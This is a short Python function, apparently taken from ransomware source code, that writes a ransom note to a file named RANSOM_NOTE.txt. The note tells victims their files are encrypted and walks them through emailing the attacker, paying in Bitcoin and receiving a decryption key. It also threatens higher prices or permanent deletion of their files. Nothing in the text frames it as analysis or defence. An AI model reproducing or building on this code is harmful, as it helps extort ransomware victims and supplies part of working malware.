
def ransom_note(file_path, primary_email, secondary_email):
    """
    This function will write the ransom note in the RANSOM_NOTE file.
    :param: file_path
    :param: primary_email
    :param: secondary_email
    :return:
    """
    with open('RANSOM_NOTE.txt', 'w') as f:
        f.write(f'''
            ** Your system have been encrypted with a Military grade encryption algorithm. **

            ** There is no way to restore your data without a special key. **

            Only we can decrypt your files!

            To purchase your key and restore your data, please follow these three easy steps:

            1. Email the file called EMAIL_ME.txt at {file_path} to {primary_email}

            2. You will receive your personal BTC address for payment.
               Once payment has been completed, send another email to {secondary_email} stating "PAID".
               We will check to see if payment has been paid.

            3. You will receive a text file with your KEY that will unlock all your files. 
               IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin 
               to decrypt all files.

            WARNING:

            - Do NOT attempt to decrypt your files with any software because that will not work, and may cost you 
            more to unlock your files.

            - Do NOT change file names, mess with the files, or run decryption software as it will cost you more 
            to unlock your files and there is a high chance you will lose your files forever.

            Do NOT send "PAID" button without paying, price WILL go up for disobedience.

            Do NOT think that we won't delete your files altogether and throw away the key if you refuse to pay.
        ''')
